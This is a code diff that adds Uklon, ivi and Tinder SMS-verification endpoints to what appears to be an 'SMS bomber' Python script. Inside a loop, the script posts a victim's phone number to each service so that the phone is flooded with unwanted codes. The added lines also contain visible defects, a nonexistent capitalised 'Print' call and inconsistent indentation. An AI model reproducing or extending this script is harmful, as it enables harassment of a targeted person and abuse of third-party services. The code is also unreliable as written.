@@ -59,3 +59,13 @@ for _ in track(range(run)):
      requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": number})
  except:
      print('Не отправельно уклон регестратура')
+ try:
+     Print('иви')
+     requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": number})
+ except:
+     print('не доставлено иви')
+try:
+    Print('тиндерр')
+    requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": number},)
+except:
+    print('не доставлено тиндер')
